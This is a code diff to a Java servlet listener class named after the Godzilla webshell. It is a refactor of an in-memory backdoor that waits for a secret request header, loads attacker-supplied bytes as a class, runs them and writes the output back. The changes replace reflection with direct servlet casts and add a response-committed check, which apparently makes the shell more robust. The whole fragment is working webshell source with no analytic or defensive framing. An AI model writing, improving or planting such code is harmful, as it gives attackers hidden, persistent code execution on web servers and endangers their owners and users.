@@ -53,7 +53,7 @@ public class GodzillaHwListenerRawBase64 extends ClassLoader implements ServletR
 
     @SuppressWarnings("all")
     private boolean run(Object request, Object response) throws Exception {
-        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        String value = ((HttpServletRequest) request).getHeader(headerName);
         if (value == null || !value.contains(headerValue)) {
             return false;
         }
@@ -63,7 +63,10 @@ public class GodzillaHwListenerRawBase64 extends ClassLoader implements ServletR
             payload = this.defineClass(data, 0, data.length);
             return true;
         }
-        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
+        if (((HttpServletResponse) response).isCommitted()) {
+            return true;
+        }
+        PrintWriter writer = ((HttpServletResponse) response).getWriter();
         try {
             byte[] result = execute(request, data);
             writer.write(md5.substring(0, 16));
@@ -90,7 +93,7 @@ public class GodzillaHwListenerRawBase64 extends ClassLoader implements ServletR
 
     @SuppressWarnings("all")
     private static byte[] readBody(Object request) throws Exception {
-        java.io.InputStream inputStream = (java.io.InputStream) request.getClass().getMethod("getInputStream").invoke(request);
+        java.io.InputStream inputStream = ((HttpServletRequest) request).getInputStream();
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
         byte[] buffer = new byte[8192];
         int read;
